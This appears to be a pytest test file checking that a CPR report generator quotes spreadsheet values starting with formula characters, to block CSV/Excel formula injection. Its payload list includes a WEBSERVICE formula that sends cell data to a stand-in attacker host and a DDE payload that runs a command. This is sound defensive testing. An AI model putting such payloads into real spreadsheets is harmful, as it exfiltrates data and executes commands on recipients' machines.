"""CPR spreadsheet/CSV formula-injection neutralization (services/cpr_generation
._formula_safe). The generated XLSX/CSV are opened in Excel by coworkers and the
receiving public bodies, so a free-text value that begins with a formula lead
character must be rendered as literal text, never evaluated as a formula/DDE
payload (CWE-1236)."""

import pytest

from app.services.cpr_generation import _formula_safe


@pytest.mark.parametrize(
    "payload",
    [
        '=WEBSERVICE("https://evil.example/?"&A1)',
        '+1+1',
        '-2+3',
        '@SUM(A1:A9)',
        '=cmd|/C calc!A0',
        '\t=1+1',   # leading tab still reaches the formula parser
        '\r=1+1',
    ],
)
def test_formula_lead_chars_are_quoted(payload):
    out = _formula_safe(payload)
    assert out == "'" + payload
    # The neutralized value no longer begins with a formula lead character.
    assert out[0] == "'"


@pytest.mark.parametrize(
    "value",
    [
        "Smith, John",
        "O'Brien",
        "3/4 EMT",
        "apprentice",
        "",              # empty string is untouched (no index error)
        "email@x.com",   # '@' only triggers when it is the FIRST character
    ],
)
def test_ordinary_text_is_untouched(value):
    assert _formula_safe(value) == value


def test_non_strings_pass_through_unchanged():
    # openpyxl binds numbers/None as native cell values; the guard must be a
    # no-op for them so numeric columns (including negative money) are never
    # corrupted into text.
    assert _formula_safe(None) is None
    assert _formula_safe(12.5) == 12.5
    assert _formula_safe(-8) == -8
    assert _formula_safe(0) == 0
